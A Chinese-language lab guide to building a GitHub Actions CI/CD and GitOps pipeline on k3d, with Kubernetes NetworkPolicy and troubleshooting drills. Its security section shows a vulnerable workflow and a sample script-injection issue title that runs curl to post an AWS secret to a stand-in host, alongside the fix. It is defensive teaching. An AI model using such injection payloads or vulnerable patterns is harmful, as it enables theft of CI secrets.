# 🧪 GitHub Actions CI/CD 融会贯通大实验 · 操作合集

> 一条**贴近生产**的 CI/CD 一条龙：代码 push → GitHub Actions 跑测试 → 打**可追溯镜像**推 GHCR
> → **只改一个独立 GitOps 配置仓库**（不碰集群）→ 自建 runner 连本机 k3d **只读冒烟验证**
> → prod **人工审批门** → 再冒烟验证 → 可复用 workflow 报告结果。做完能有面试实力。
> 环境：**Windows 11 Home 用 WSL2 + k3d**（跟 Jenkins 大实验同一套底座）。
> 代码/脚本都在 `labs/github-actions/`，本页只列**操作**；括号里是对应的 KodeKloud 课程章节。
> 目标应用：`app/`（dasher-svc，Node/Express 外卖订单服务）。

**⚠️ 先读这段再动手**：这门课的 CD 职责边界 = 只改 GitOps 仓库的 Git，绝不 `kubectl apply`。
真正把新版本同步进集群是 `labs/argocd/` 大实验的活。这个大实验做到"GitOps 仓库改对了 tag、
自建 runner 冒烟验证通过"就算完整闭环；没装 ArgoCD 之前，`verify-dev`/`verify-prod` 会因为
集群里还没有对应 Deployment 而 curl 失败——这是预期的，等 ArgoCD 大实验接上去才会真正绿。
详见 `README.md` 里的"跨仓库契约"。

## 0 · 起环境 (Types of Runners / Installing a Self-Hosted Runner)

- 一次性：Windows PowerShell(管理员) 跑 `wsl --install`（装过 Jenkins 大实验的可跳过）
- Ubuntu 里进 `labs/github-actions/runner/wsl2-k3d/` 跑 `bash setup.sh`
  - 装好：docker + k3d(集群名 `gitops`，映射 dev:30081/prod:30082) + kubectl + node
  - 顺便把 GitHub Actions runner 官方二进制下载到 `actions-runner/`（还没注册，见第 7 步）
- 自检：`kubectl get nodes`、`kubectl get ns`（能看到 `dasher-dev`/`dasher-prod`）
- 详细见 `runner/wsl2-k3d/README.md`

## 1 · 建一个独立仓库 (Introduction / Create-Explore-GitHub-Account)

- GitHub Actions 的 workflow 必须放在**仓库真实根目录**的 `.github/workflows/`，不像 Jenkins
  能在 UI 里指定 Script Path 去子目录找——所以要新建一个 GitHub 仓库（比如 `dasher-svc`），
  把 `labs/github-actions/` 目录下的所有文件（含隐藏的 `.github/`）当作**该仓库的根目录**推上去
- `git init && git add -A && git commit -m "init dasher-svc" && git remote add origin <你的新仓库> && git push -u origin main`

## 2 · 仓库级 Secrets + 权限 (Working-with-Repository-Level-Secrets)

- Settings → Actions → General → Workflow permissions：确认 "Read and write permissions"
  开着（`build-push` job 要用内置 `GITHUB_TOKEN` 推 GHCR，需要 `packages: write`）
- Settings → Secrets and variables → Actions → New repository secret，加两个：
  - `GITOPS_REPO`：你的 GitOps 配置仓库，`owner/repo` 格式（先随便建一个空仓库占位也行，
    第 6 步会详细讲它该长什么样，或者直接用 ArgoCD 大实验准备好的模板仓库）
  - `GITOPS_PAT`：一个有该仓库 push 权限的 Personal Access Token（跨仓库 `GITHUB_TOKEN` 不够用）

## 3 · 第一条 workflow：跑测试 (Workflow-Configure-Unit-Testing / Using-a-matrix-for-your-jobs)

- push 后打开 Actions 标签页，看 `dasher-svc CI/CD` 跑起来，`test` job 应该有 **node 18 / node 20**
  两条并行的腿（`Using-a-matrix-for-your-jobs` + `Additional-Matrix-Configuration` 两课）
- 看 `test` job 的 Summary，node20 那条腿会多一个 artifact `dasher-svc-test-log`
  （`Storing-workflow-data-as-artifacts` 一课）——点开下载看看内容

## 4 · 构建镜像推 GHCR (Workflow-Docker-Login / Workflow-Docker-Build-and-Test / Workflow-Login-and-Push-to-GHCR)

- `build-push` job 变绿后，去仓库主页右侧 **Packages** 看有没有出现 `dasher-svc` 镜像
- 记下这次的 tag（形如 `12-a1b2c3d`）——job Summary 或者 `docker login` 后 `docker pull` 都能验证

## 5 · Environments：建 dev / prod (Understand-Github-Environments / Create-Dev-Environment-Secrets-Environment-Rules / Create-Prod-Environment-Secrets-Environment-Rules)

- Settings → Environments → New environment，建两个：`dev`、`prod`
- `dev` **不加任何保护规则**——workflow 里 `bump-gitops-dev` job 引用 `environment: dev`，
  没规则就是直通，体会"引用 environment 不等于一定要审批"
- `prod` 勾上 **Required reviewers**，把自己加进去（最多 6 人，一个人点头就放行）
  ——**这一步纯手动，脚本做不到**，workflow 文件里只能声明 `environment: prod`，
  真正的"要不要卡审批"是仓库设置决定的

## 6 · 准备 GitOps 配置仓库 (对应 CD 整体理解 Understand-Deployment-Usecase)

- 直接复用 ArgoCD 大实验准备好的模板：`labs/argocd/gitops-repo/`（结构见下），推成一个独立仓库即可。
  ```
  overlays/dev/kustomization.yaml
  overlays/prod/kustomization.yaml
  ```
  每个 `kustomization.yaml` 里要有：
  ```yaml
  images:
    - name: ghcr.io/<OWNER>/dasher-svc   # 注意：是完整镜像地址，不是短名 dasher-svc
      newTag: "0-0000000"                 # 占位 tag
  ```
- **⚠️ 实测踩过的坑**：`name:` 字段必须跟 `ci-cd.yml` 传给 composite action 的
  `image-name`（= `ghcr.io/${{ github.repository_owner }}/dasher-svc`，真实 owner）
  逐字一致——`labs/argocd/gitops-repo/` 模板里默认写的是字面量占位符 `OWNER`，
  **必须手动改成你真实的 GitHub 用户名/组织名**（`base/deployment.yaml` 的 `image:`
  字段和两个 `overlays/*/kustomization.yaml` 的 `images[].name` 都要改，三处逐字一致）。
  忘记替换的话，yq 的 `select(.name == ...)` 匹配不到任何元素，`newTag` 静默不更新、
  commit 也不会产生（`git diff --cached` 是空的）——**没有任何报错**，`verify-dev`
  会一直卡在"线上版本对不上"，排查时最先查这个。本地已用 yq 手工复现过这个失败模式
  和修复后的成功模式（把 `name:` 从字面量 `OWNER` 换成真实 owner 后 select 才生效）。
- 这就是本实验流水线唯一会写入的地方——`GITOPS_REPO` secret 指向它

## 7 · 自定义 composite action (Custom-Actions 全章)

- `.github/actions/bump-gitops-tag/action.yml` 就是这门课的 composite action 实操：
  `checkout` 别的仓库 → 装 `yq` → 改 `kustomization.yaml` → `commit` + `push`
- 对照读一遍 `Metadata-syntax-for-GitHub-Actions`（inputs/outputs/runs.using）和
  `Create-a-Composite-Action`，理解为什么这里选 composite 而不是 Docker/JS action
- 想直观看到它被调用：Actions 里点开一次 `bump-gitops-dev` job，展开步骤能看到
  `Bump GitOps Image Tag` 这个复合动作把 checkout/装yq/改文件/push 几步都摊开显示

## 8 · 自建 Runner 接入本机 k3d (Self-Hosted-Runner 全章)

- 按 `runner/wsl2-k3d/README.md` 走完注册：仓库 Settings → Actions → Runners → New self-hosted
  runner，复制 token，回 WSL 跑 `./config.sh ... --labels wsl2-k3d`，再 `sudo ./svc.sh install && start`
- 确认 Runners 页面状态变 **Online**，标签里能看到 `wsl2-k3d`
- **强调一遍边界**：`verify-dev`/`verify-prod` 这两个 job 里只有 `curl`，**没有 kubectl**——
  自建 runner 是拿来验证部署结果的，不是拿来做部署的。这个设计本身就是安全考点：
  给自建 runner kubectl 权限，等于给了一台"随时可能跑陌生 workflow 代码"的机器改集群的能力，
  生产上是要极力避免的

## 9 · 打通全链路 (Continuous-Deployment 全章 + If-Expressions-and-Pull-Request + workflow-dispatch-Input-Options)

- 装完 ArgoCD（另一个大实验）并让它盯上第 6 步的 GitOps 仓库后，重新触发一次
  `workflow_dispatch`（Actions 页面手动 Run workflow），观察：
  1. `bump-gitops-dev` 改完 GitOps 仓库的 dev overlay 就绿了（不用等审批，`dev` environment 无保护规则）
  2. `verify-dev` 在自建 runner 上跑，等 ArgoCD 同步完，`curl :30081/api/version` 断言 tag 对上
  3. `promote-prod` 卡住，Actions 页面出现 **Review deployments** 按钮，点 Approve 才继续
     （这就是 Continuous Delivery 的"人工审批门"；如果 `dev` 那种直通到底，就是 Continuous Deployment）
  4. 批准后 `promote-prod` 改 prod overlay，`verify-prod` 在自建 runner 上验证 `:30082`
- 还没配好 ArgoCD、只想验证 dev 这段闭环：手动 Run workflow 时把 `skip_prod` 填 `true`，
  流水线会在 `verify-dev` 之后就停，不去碰 prod environment（`workflow-dispatch-Input-Options` 一课）

## 10 · 可复用 workflow 报告结果 (Reusable-Workflows-and-Reporting 全章)

- 不管前面哪个 job 红没红，最后 `report` job 都会跑（`if: always()`），调用
  `.github/workflows/notify-slack.yml`（`workflow_call` + `with:` 传参，`Step-1~4` 系列课）
- 想看到真的 Slack 消息：照 `Slack-Notify-GitHub-Action` 一课建个 Incoming Webhook，
  存成仓库级 secret `SLACK_WEBHOOK_URL`；没配也没关系，`notify-slack.yml` 会自动退化成打日志，
  不会让整条流水线因为没配 Slack 就跑不通——这个"optional secret + 优雅降级"的写法本身就值得记住

## 11 · 安全加固 (Security-Guide 全章)

- **CodeQL**：`.github/workflows/security.yml` push/PR 到 main 都会跑，另外每周四兜底跑一次；
  跑完去仓库 **Security → Code scanning** 标签页看有没有告警（对应 `Use-CodeQL-as-a-step-in-a-workflow`）
- **Script Injection 攻防（只讲文字，不在仓库放真漏洞文件）**：

  假设要写一个"读 issue 标题、判断是不是 bug"的 workflow，**危险写法**是把 `${{ }}`
  表达式直接拼进 `run:` 的 shell 脚本里：

  ```yaml
  # ❌ 危险：untrusted 输入直接拼进 shell
  steps:
    - name: Add a Label
      env:
        AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
      run: |
        issue_title="${{ github.event.issue.title }}"
        if [[ "$issue_title" == *"bug"* ]]; then
          echo "bug!"
        fi
  ```

  攻击者只要把 issue 标题起成：

  ```
  bug"; curl --request POST --data anything=$AWS_SECRET_ACCESS_KEY https://evil.example/dump
  ```

  GitHub 在渲染 `run:` 之前会先把 `${{ github.event.issue.title }}` 原样替换进 YAML 文本，
  于是 shell 实际执行的是 `issue_title="bug"; curl ...`——多出来的 `curl` 命令直接执行，
  能把 `$AWS_SECRET_ACCESS_KEY` 偷走。

  **修复写法**：把不可信输入放进 `env:`，shell 里用 `$issue_title` 变量引用它，
  而不是让 `${{ }}` 直接出现在 `run:` 脚本正文里：

  ```yaml
  # ✅ 安全：untrusted 输入经 env 变量中转，永远只是一个字符串值
  steps:
    - name: Add a Label
      env:
        AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
        issue_title: ${{ github.event.issue.title }}
      run: |
        if [[ "$issue_title" == *"bug"* ]]; then
          echo "bug!"
        fi
  ```

  原理：`${{ }}` 表达式只在**拼 YAML 文本**这一步被替换，`env:` 里的值是作为环境变量传给
  shell 进程的，shell 不会对环境变量的内容再"解析成命令"去执行，所以再怎么构造 `"; curl ...`
  也只是一段普通字符串。`.github/actions/bump-gitops-tag/action.yml` 里用 yq 的 `strenv()`
  而不是把 `${{ inputs.tag }}` 直接拼进 yq 表达式字符串，就是同一个道理的实际应用——
  可以对照着读一遍。

- **最小权限**：`ci-cd.yml` workflow 级只给 `contents: read`，`packages: write` /
  `security-events: write` 都下放到具体需要的 job 上（`Security-hardening-for-GitHub-Actions` 一课）
- **Action Pinning**（进阶，本实验用的都是官方/知名 action 的 major 版本 tag 如 `@v4`，
  更严格的生产环境会钉到 commit SHA，防止上游 tag 被劫持后偷偷变更行为）

## 12 · 收工

- `bash runner/wsl2-k3d/teardown.sh`（只停自建 runner，**默认保留**共享的 k3d 集群 `gitops`，
  因为 ArgoCD 大实验可能还要用；两个实验都做完了再加 `--with-cluster` 彻底清场）
- 去 GitHub 仓库 Settings → Actions → Runners 手动 Remove 掉注册记录（脚本做不到这步）

---

# 🛡️ 应用隔离与部署排障（原独立 CKA 大实验的 NetworkPolicy/Troubleshooting 部分并入本实验）

> **为什么并到 GitHub Actions 大实验里**：这两块是**"应用侧"**的集群运维——给这条流水线部署的
> `dasher-dev`/`dasher-prod` 做网络隔离、以及排查部署常见故障，天然贴着 CI/CD 走。尤其 NetworkPolicy
> 这节的第一约束就是**不能打断本实验第 8/9 节自建 runner 对 `:30081`/`:30082` 的 NodePort 冒烟 curl**——
> 这正是"运维加固不能打断正在跑的 CI/CD 验证"这个真实约束的落地。（纯集群生命周期运维——etcd 备份、
> 节点升级——不贴 CI/CD，另立 `labs/cluster-ops/`。）
>
> ⚠️ 这两节直接跑在活的 `gitops` 集群上，可逆性是纪律：第 13 节结尾把新增策略删干净；第 14 节的故障
> 对象都是一次性的、各自 `undo`。对应 CKA **Services & Networking** 和 **Troubleshooting** 域。

## 13 · NetworkPolicy 隔离 dasher-dev↔dasher-prod (CKA Services & Networking)

**目标**：给 `dasher-prod` 做东西向隔离——**同命名空间能通、外部 NodePort 能进（不打断本实验的冒烟验证）、
但 dasher-dev 的 Pod 不能横向摸到 dasher-prod**，并讲清"忘开 DNS egress"这个经典大坑。清单在
`network-policies/`，**必须按顺序 apply**（先默认拒绝，再逐条放行）。

```bash
cd network-policies

# 先量一次基线：从 dasher-dev 起一个探针 Pod 打 dasher-prod，此刻应该是通的（还没加策略）
kubectl run probe -n dasher-dev --rm -it --image=busybox --restart=Never -- \
  wget -qO- --timeout=3 http://dasher-svc.dasher-prod:8000/healthz     # 现在应回 ok

# 1) 默认拒绝 dasher-prod 的所有入向流量（白名单模式起点）
kubectl apply -f dasher-prod-default-deny.yaml
# 2) 放行两个口子：同命名空间 Pod 互访 + 外部(NodePort 冒烟验证/人肉 curl)
kubectl apply -f dasher-prod-allow-same-ns-and-external.yaml
# 3) 放行 DNS egress（本实验只对 dasher-prod 做了 Ingress 限制，这条是"预置+讲原理"，见下面大坑）
kubectl apply -f dasher-prod-allow-dns-egress.yaml

kubectl get networkpolicy -n dasher-prod   # 应看到 default-deny-ingress / allow-same-namespace /
                                           #        allow-external-nodeport-healthchecks / allow-dns-egress
```

**验证三条边界**（这一节的产出）：

```bash
# ① 外部 NodePort 依旧能进（保住本实验第 8/9 节自建 runner 对 :30082 的冒烟 curl）
curl -s http://localhost:30082/healthz     # ✅ 应回 ok —— 证明"运维加固没打断已有 CI/CD 冒烟验证"

# ② dasher-prod 命名空间内部互访不受影响（同命名空间放行）
kubectl exec -n dasher-prod deploy/dasher-svc -- wget -qO- --timeout=3 http://dasher-svc.dasher-prod:8000/healthz  # ✅ ok

# ③ 跨命名空间横向移动被挡（真正的隔离目标）：dasher-dev 的 Pod 打 dasher-prod 应超时
kubectl run probe -n dasher-dev --rm -it --image=busybox --restart=Never -- \
  wget -qO- --timeout=3 http://dasher-svc.dasher-prod:8000/healthz     # 🚫 预期超时/拒绝

# ④ DNS 仍能解析（Ingress 策略不拦 DNS，此刻正常）
kubectl exec -n dasher-prod deploy/dasher-svc -- nslookup kubernetes.default   # ✅ 正常解析
```

**该看到什么（本实验 k3d 默认 CNI = flannel + kube-router 下的实测现象，务必以你自己实测为准）**：
`:30082` 外部 curl 和同命名空间访问都正常，**dasher-dev→dasher-prod 在本环境会超时**——达到"只挡集群内
跨命名空间横向移动、不锁死对外暴露"的效果。为什么 NodePort 能进？NodePort 流量在 k3d 的 flannel+kube-router
实现里源地址被识别为"外部"、命中 `ipBlock: 0.0.0.0/0` 放行规则；dasher-dev 的 Pod 走 ClusterIP/Pod IP
打过来，在本实现里源是集群内 Pod IP、不命中这条"外部"放行、被 default-deny 挡住。

> ⚠️ **别把 dev→prod 超时当定论——`0.0.0.0/0` 是否也放行 Pod→Pod 取决于 CNI**：`0.0.0.0/0` 字面上把
> **整个 IPv4** 都放行，本就**包含集群 Pod CIDR**。本实验能挡住 dasher-dev 的 Pod，靠的是 kube-router 把
> `ipBlock` 里这条只当"外部识别"的源来匹配、而 dev Pod 的源是集群内 Pod IP；**换 Calico / Cilium / 云厂商
> CNI，`0.0.0.0/0` 完全可能连 Pod CIDR 一起放行 → dev→prod 变成放行、不再超时**。要稳妥地"放外部、但排除
> 集群内 Pod"，规范做法是给 `ipBlock` 加 `except:` 把 Pod CIDR 显式挖掉：
> ```yaml
> - ipBlock:
>     cidr: 0.0.0.0/0
>     except: ["10.42.0.0/16"]   # k3d/k3s 默认 Pod CIDR，按你集群实际改
> ```

> ⚠️ **CNI 到底 enforce 不 enforce（比 DNS 更值得你深挖的一层）**：NetworkPolicy 只是一份"期望"，
> 真正拦不拦流量取决于 CNI 的 dataplane——
> - **纯 flannel 根本不实现 NetworkPolicy**，策略写了也是摆设；k3s（k3d 底层）默认额外跑了 kube-router 的
>   Network Policy Controller，用 **iptables/ipset** 把策略翻译成规则，所以这里能直接生效。
> - **iptables vs eBPF 两种 dataplane**：Calico、Cilium 可选 eBPF 直接在内核 hook 上匹配，相比 iptables
>   线性 match，规则规模大时延迟更稳、可观测性更强（如 Cilium Hubble）；纯 iptables 实现则规则一多链就变长。
>   面试被问"我的 NetworkPolicy 为什么不生效"，第一反应就是**查 CNI 支不支持、用的哪种 dataplane**。
> - **NodePort 源地址（你的强项交叉区）**：本实验放行外部靠的是"NodePort 流量源被识别为集群外"。但这强依赖
>   `Service.spec.externalTrafficPolicy`——默认 `Cluster` 会 **SNAT/masquerade**，客户端真实源 IP 被节点 IP 顶替
>   （想按真实 client IP 写 `ipBlock` 就会失配）；`Local` 保留源 IP 但只把流量投给本节点上有 Pod 的情况。
>   源地址是保留还是伪装，直接决定 `ipBlock`/`namespaceSelector` 规则命不命中。

> 📌 **适用边界（生产判断，别照搬）**：上面这套现象**只在本实验的 k3d/k3s 默认网络（flannel + kube-router）
> 下验证过**。换 **Calico / Cilium / 云厂商 CNI**（AWS VPC CNI、Azure CNI、GKE Dataplane V2 等）时，NodePort 的
> source-IP 保留/伪装、以及策略对"外部流量"的判定都可能不一样，**必须在目标环境重新验证**，不能拿本实验结论当定论。

> 🔥 **经典大坑：忘开 DNS egress**。只加 Ingress 不拦 DNS；但一旦顺手把 **Egress default-deny** 也开上
> （防 Pod 被攻破后外联下载恶意载荷），CoreDNS（在 kube-system，UDP/TCP 53）首当其冲——症状是应用报
> `DNS resolution failed` 而不是"network policy"，排查方向极易被带偏。所以做 Egress 收紧时**必须同时放行 53**。
> 想亲手体验一次（`dasher-prod-allow-dns-egress.yaml` 文件尾部有完整步骤）：
> ```bash
> # 临时加一条 Egress 全拒绝，触发大坑
> kubectl apply -n dasher-prod -f - <<'EOF'
> apiVersion: networking.k8s.io/v1
> kind: NetworkPolicy
> metadata: { name: temp-default-deny-egress }
> spec: { podSelector: {}, policyTypes: ["Egress"] }
> EOF
> kubectl exec -n dasher-prod deploy/dasher-svc -- nslookup kubernetes.default   # 🚫 解析超时——大坑现形
> kubectl apply -f dasher-prod-allow-dns-egress.yaml                             # 放行 DNS(UDP/TCP 53)
> kubectl exec -n dasher-prod deploy/dasher-svc -- nslookup kubernetes.default   # ✅ 恢复
> kubectl delete networkpolicy temp-default-deny-egress -n dasher-prod           # 收尾撤掉临时策略
> ```

> 🎯 **面试话术**：我给一个 prod 命名空间做过东西向隔离，思路是白名单——先 default-deny 入向，再精确放行两类：
> 同命名空间互访、和外部 NodePort 健康检查。**关键是没放行别的命名空间**，这样 dev 命名空间的 Pod 就没法
> 横向摸到 prod 的 Pod，但对外暴露的口子和正在跑的 CI 冒烟验证一个都没打断——安全不是把所有东西都堵上。
> 我还特意留了一条 DNS egress 策略讲原理：很多人加 Egress default-deny 时忘了放行 53 端口，结果整个命名空间
> 域名解析全挂，报错还是"DNS failed"不是"network policy"，排查方向都被带偏——这个坑我踩过、也知道怎么一眼看穿。
> 至于 dev→prod 到底挡不挡，还取决于 CNI 的 dataplane——我在 k3d 默认 CNI 下实测是挡住的，但 `0.0.0.0/0` 本就
> 含 Pod CIDR，换 Calico/Cilium/云厂商 CNI 可能连 Pod 一起放行，我不会拿一个环境的结论当定论，换环境一定重测。
>
> 🎯 **English (interview)**: I did east-west isolation on a prod namespace with a whitelist model —
> default-deny ingress, then allow exactly two paths: same-namespace traffic and external NodePort health
> checks. The key is *not* allowing other namespaces, so a dev-namespace pod can't move laterally into prod,
> while the external port and the running CI smoke checks stay up — security isn't blocking everything.
> I also keep a DNS-egress rule around to teach the classic trap: the moment you add an Egress default-deny
> and forget to allow port 53, the whole namespace's name resolution dies — and the error reads "DNS
> resolution failed", not "network policy", which sends triage the wrong way. I've hit it and know how to
> spot it instantly. Whether a NetworkPolicy is actually enforced depends on the CNI dataplane — plain
> flannel doesn't enforce it at all — so "my policy isn't working" starts with checking the CNI, not
> re-reading the YAML.

**收尾（把这一节加的四条策略删掉，`dasher-prod` 恢复"默认全通"）**：

```bash
kubectl delete -f dasher-prod-allow-dns-egress.yaml
kubectl delete -f dasher-prod-allow-same-ns-and-external.yaml
kubectl delete -f dasher-prod-default-deny.yaml
kubectl delete networkpolicy temp-default-deny-egress -n dasher-prod --ignore-not-found  # 若体验过 DNS 大坑
kubectl get networkpolicy -n dasher-prod   # 应为空
cd ..
```

## 14 · 部署故障注入排障 (CKA Troubleshooting)

**目标**：用 `faults/inject.sh` 往集群里注入 4 类 CKA 高频故障，**先自己用 `describe`/`events`/`logs` 诊断，
卡住再对答案**（`faults/solutions.md`）。四个故障都是独立一次性对象，不碰 `dasher-svc` 本身。玩法见
`faults/README.md`。

> ⚠️ **跨 lab 前提**：这套故障原属独立 CKA 大实验，拆分后 RBAC 和节点运维分别去了 argocd / cluster-ops
> 两个 lab，所以**故障 1 依赖 `labs/argocd/cluster-rbac/gen-kubeconfig.sh` 先签发过 `new-hire.kubeconfig`；
> 故障 2 依赖 `labs/cluster-ops/upgrade-drill/node-upgrade-drill.sh add` 先加过 `cka-worker` 节点**。
> `inject.sh`/`solutions.md` 里已用跨 lab 相对路径指过去；故障 3/4 自包含、无跨 lab 依赖，随时能跑。

### 14a · 可立即跑（故障 3 / 4，本 lab 自足，无跨 lab 依赖）

```bash
cd faults

# 故障 3：PVC 一直 Pending（Storage 域）
bash inject.sh 3
kubectl describe pvc scratch-data -n dasher-dev     # Events 找 ProvisioningFailed / 找不到 StorageClass
kubectl get storageclass                            # 集群真实只有 local-path；PVC 却写了 fast-nvme(打错字)
# 修：storageClassName 是 immutable 字段，改不了、只能删了重建（这本身就是 CKA 常考细节）
bash inject.sh undo 3

# 故障 4：Pod 一直 Pending（Workloads & Scheduling 域）
bash inject.sh 4
kubectl describe pod -l app=scratch-workload -n dasher-dev
#   Events: FailedScheduling ... 0/N nodes are available: didn't match Pod's node affinity/selector
kubectl get nodes --show-labels                     # 没有节点带 disktype=ssd → nodeSelector 匹配不上
# 修二选一：
#  (a) 给节点补上 nodeSelector 要的 label —— 先导出节点名再 label，别手填占位符：
NODE=$(kubectl get nodes -o name | head -n1 | sed 's#node/##')   # 取第一个节点名（单节点集群就是它）
kubectl label node "$NODE" disktype=ssd                          # Pod 随即被调度上去
#  (b) 或者删掉 Pod 清单里那条匹配不到的 nodeSelector（改回本无该约束的版本）
bash inject.sh undo 4
cd ..
```

### 14b · 跨 lab 加餐（故障 1 / 2，需先做前置：argocd §11 的 RBAC / cluster-ops 的加节点）

这两个故障依赖别的 lab 建好的对象，先把**前置**跑一遍再注入（对应 lab 已做过就跳过对应那行）：

```bash
cd faults   # 从 labs/github-actions/ 起；下面相对路径都以 faults 为基准

# —— 前置（一次性）——
# 故障 1 需要 new-hire.kubeconfig：到 argocd cluster-rbac 建身份并签一份（子 shell 内 cd，跑完自动回 faults）
( cd ../../argocd/cluster-rbac && kubectl apply -f 00-namespace-and-serviceaccounts.yaml && bash gen-kubeconfig.sh new-hire )
# 故障 2 需要 cka-worker 节点：到 cluster-ops upgrade-drill 加一个（子 shell 内 cd 跑，跑完自动回 faults）
( cd ../../cluster-ops/upgrade-drill && bash node-upgrade-drill.sh add )

# 故障 1：kubeconfig 凭证损坏（Cluster Architecture / 认证）
#   前提：上面“前置”已在 labs/argocd/cluster-rbac/ 签发过 new-hire.kubeconfig
bash inject.sh 1
#   注入脚本把坏掉的 kubeconfig 写在 faults/ 目录下(不是 fixtures/)，名为 new-hire-broken.kubeconfig
kubectl --kubeconfig=new-hire-broken.kubeconfig get pods -n dasher-dev
#   报 "You must be logged in to the server (Unauthorized)" —— 注意 Unauthorized(认证没过)
#   跟 Forbidden(认证过了但 RBAC 不让) 是两个方向！token 被截断了一半
# 修：TokenRequest 是无状态的，直接重签：cd ../../argocd/cluster-rbac && bash gen-kubeconfig.sh new-hire
rm -f new-hire-broken.kubeconfig                    # 故障1是文件，直接删掉即清理

# 故障 2：节点 NotReady（Cluster Maintenance / Troubleshooting）
#   前提：先跑过 cluster-ops 的 upgrade-drill add（labs/cluster-ops/upgrade-drill/），集群里存在 cka-worker 节点
bash inject.sh 2
sleep 45                                            # 等过 node-monitor-grace-period(默认 40s)
kubectl get nodes                                   # cka-worker 变 NotReady
kubectl describe node $(kubectl get nodes -o name | grep cka-worker | sed 's#node/##')
#   Conditions 里 Ready 的 Reason 类似 "Kubelet stopped posting node status"
bash inject.sh undo 2                               # docker unpause，几十秒后自动回 Ready
cd ..
```

**该看到什么/学到什么**：
- 故障 1：分清 **Unauthorized(认证)** vs **Forbidden(授权)**，排查方向完全不同。
- 故障 2：**NotReady 是"节点没按时打卡"不是"被判死刑"**——kubelet 心跳恢复后 controller-manager 自动改回 Ready，
  不用手动 kubectl。顺带体会为什么生产要"节点≥2 + 副本≥2"（单节点故障就是全灭）。
- 故障 3：**immutable 字段（PVC 的 storageClassName）改不了，只能删了重建**——不是所有字段都能 edit/patch。
- 故障 4：**`get pods` 只显示 Pending 什么都看不出，必须 `describe` 看 Events**——养成先看 Events 的习惯。
- 通用套路：`kubectl describe` → 看 **Events** → `kubectl get events --sort-by=.lastTimestamp` 拉时间线 →
  `kubectl logs`。这就是 Troubleshooting 域的实战版。

> 设计取舍（见 `faults/README.md`）：没做"改坏 kube-apiserver 静态 Pod manifest"这类故障——k3s/k3d 里
> apiserver 不是静态 Pod（跑在 k3s 单二进制进程里），硬模拟出来的现象跟真实 kubeadm 集群对不上，容易学出
> 错误直觉，这类留给笔记用文字讲原理即可。

> 🎯 **面试话术**：排障我有套固定套路——先 `kubectl describe` 看 Events，再 `get events` 按时间排拉时间线，
> 最后才 `logs`。举几个我练过的典型：PVC 一直 Pending，八成是 storageClassName 打错字或没有对应 provisioner，
> 而且这字段 immutable、只能删了重建；Pod 一直 Pending 光看 `get pods` 什么都看不出，一定要 describe 看
> FailedScheduling，通常是 nodeSelector/affinity 匹配不到节点或资源不够；节点 NotReady 我会先分清是不是
> kubelet 心跳超了 grace period，很多时候节点自己会恢复，不用瞎动。还有个爱考的点是分清 Unauthorized 是
> 认证没过、Forbidden 是 RBAC 不让，报错长得像但排查方向反着来。
>
> 🎯 **English (interview)**: I have a fixed troubleshooting loop — `kubectl describe` for Events first,
> then `get events` sorted by time for a timeline, and only then logs. A few patterns I've drilled: a PVC
> stuck Pending is usually a typo'd storageClassName or a missing provisioner, and that field is immutable
> so you delete and recreate; a Pod stuck Pending shows nothing under `get pods`, you must describe for
> FailedScheduling; a NotReady node is often just a kubelet heartbeat past its grace period and self-heals.
> And I always separate Unauthorized (authn failed) from Forbidden (authn passed, RBAC denied) — they look
> alike but the fix is the opposite direction.

---

## 🚀 进阶（面试加分，做完基础版再挑着来）

- **Action Pinning 到 commit SHA**：把 `actions/checkout@v4` 这类换成 `actions/checkout@<40位sha>`，
  体会"tag 可变、SHA 不可变"这个供应链安全的核心区别（`Third-Party-Review` 相关）。
- **组织级共享 workflow / 模板**：把 `notify-slack.yml` 挪到一个单独的 `.github` 仓库，
  跨多个项目仓库复用（`Organizations-Templated-workflow` 一课）。
- **HashiCorp Vault 存密钥**：`GITOPS_PAT` 这类长期有效的凭据，生产里更常见的做法是走
  Vault 动态签发短时效 token，而不是存成永久 repo secret（`Securing-Secrets-using-HashiCorp-Vault`）。
- **Wait Timer**：给 `prod` environment 加一个等待窗口（比如 10 分钟冷静期），
  跟 Required reviewers 叠加使用。
- **组织级自建 runner + 分组**：把 runner 从仓库级挪到组织级，用 `Managing-self-hosted-runners-using-groups`
  控制哪些仓库能用哪些 runner（企业多团队场景）。

## 🎯 做完这个实验，你面试能讲什么

- **GitOps 而非直接部署的 CD 设计**：CI 流水线只改 Git（GitOps 配置仓库），
  从不直接 `kubectl apply`；部署入口唯一、可审计，ArgoCD 负责把 Git 状态同步进集群
- **自建 Runner 的正确用法边界**：只做部署后只读校验，不给它写权限——避免"能跑陌生代码的机器
  同时又有集群写权限"这个典型供应链风险
- **可追溯制品**：镜像 tag = run_number + Git 短 SHA，杜绝 `:latest` 漂移
- **Environments 分层审批**：dev 无保护规则直通（Continuous Deployment）、
  prod 配 Required reviewers（Continuous Delivery），同一套 workflow 逻辑两种模式
- **Composite Action + Reusable Workflow**：把重复逻辑（改 GitOps tag / 上报结果）
  收敛成可复用单元，而不是到处复制粘贴 YAML
- **CI/CD 安全加固**：Script Injection 攻防（`env:` 间接引用 vs 直接拼进 `run:`）、
  CodeQL 静态扫描、workflow 级最小权限
- **matrix / concurrency / timeout / job outputs / if-expression / artifacts**：
  这门课几乎所有核心语法点，在一条真实链路里全用上了，不是孤立练语法

**一句话简历**：设计并落地了一条 GitHub Actions CI/CD 流水线，坚持 GitOps 部署边界
（CI 只改配置仓库、不直接操作集群），用自建 Runner 做跨内外网的部署后校验，
Environments 分层实现 dev 自动直通 / prod 人工审批，配合 Composite Action 和 Reusable
Workflow 消除重复逻辑，并落地 CodeQL 扫描与脚本注入防护等安全加固。

**验收**：push 后 test(两个 node 版本) → build-push → GitOps dev overlay 被自动改 tag 并
（配合 ArgoCD 后）冒烟验证通过；手动 Approve 后 prod overlay 同样被改、冒烟通过；
不管成败流水线末尾都产出一次结果报告；`security.yml` 能在 Security 标签页看到 CodeQL 结果；
全程搜不到任何一处 `kubectl apply`/`kubectl set image`。
